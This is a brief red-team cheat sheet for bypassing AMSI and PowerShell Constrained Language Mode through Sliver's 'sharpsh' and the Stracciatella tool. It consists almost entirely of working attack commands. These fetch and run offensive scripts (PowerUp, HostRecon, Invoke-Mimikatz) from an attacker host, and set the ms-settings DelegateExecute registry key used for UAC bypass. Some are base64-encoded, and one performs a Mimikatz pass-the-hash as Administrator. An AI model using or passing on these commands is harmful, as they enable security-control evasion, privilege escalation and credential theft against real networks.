# Bypass AMSI and CLM

### 1) Run a single command

    sharpsh -t 20 -- '-c "whoami /all"'
    sharpsh -t 20 -- '-c "$ExecutionContext.SessionState.LanguageMode"'

### 2) # Running a script from remote address (without args) - just pass 1 as the arg as it requires something or won't run

    sharpsh -t 200 -- '-u http://10.10.10.11/powershell-scripts/Footholder-V3.ps1 -c 1'

### 3) Running a script from remote address (with args)

    sharpsh -t 20 -- '-u http://10.10.10.11/powershell-scripts/PowerUp.ps1 -c "Invoke-AllChecks"'
    sharpsh -t 200 -- '-u http://10.10.10.11/powershell-scripts/HostRecon.ps1 -c "Invoke-HostRecon"'

### 4) Encoding of commands with lots of quotes (use cyberchef)

    New-ItemProperty "HKCU:\software\classes\ms-settings\shell\open\command" -Name "DelegateExecute" -Value "" -Force
    sharpsh -- -e -c TmV3LUl0ZW1Qcm9wZXJ0eSAiSEtDVTpcc29mdHdhcmVcY2xhc3Nlc1xtcy1zZXR0aW5nc1xzaGVsbFxvcGVuXGNvbW1hbmQiIC1OYW1lICJEZWxlZ2F0ZUV4ZWN1dGUiIC1WYWx1ZSAiIiAtRm9yY2U=

### 5) Running commands with length > 256 characters - Sliver uses donut on backend which only supports 256 chars, run within process using `-i`

    Invoke-Mimikatz -Command "privilege::debug token::elevate `"sekurlsa::pth /user:Administrator /domain:domain.com /ntlm:ffffffffffffffffffffffffffffffff`" exit"
    sharpsh -i -t 40 -- -u 'http://10.10.10.11/powershell-scripts/Invoke-Mimikatz.ps1' -e -c SW52b2tlLU1pbWlrYXR6IC1Db21tYW5kICJwcml2aWxlZ2U6OmRlYnVnIHRva2VuOjplbGV2YXRlIGAic2VrdXJsc2E6OnB0aCAvdXNlcjpBZG1pbmlzdHJhdG9yIC9kb21haW46aW5maW5pdHkuY29tIC9udGxtOjVmOTE2M2NhM2I2NzNhZGZmZjI4MjhmMzY4Y2EzNzYwYCIgZXhpdCI=

## Stratiatella

    execute-assembly -i /home/kali/tools/bins/csharp-files/Stracciatella.exe -c "$ExecutionContext.SessionState.LanguageMode"
